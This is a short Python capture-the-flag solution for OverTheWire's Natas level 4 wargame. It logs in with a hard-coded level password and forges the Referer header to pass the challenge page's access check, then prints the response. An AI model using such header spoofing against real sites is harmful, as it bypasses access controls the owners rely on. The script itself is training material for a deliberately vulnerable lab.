import requests

username = "natas4"
password = "tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"

url = f"http://{username}.natas.labs.overthewire.org/"
headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

response = requests.get(url, auth = (username, password), headers = headers)
content = response.text

print(content)
print(response.headers)


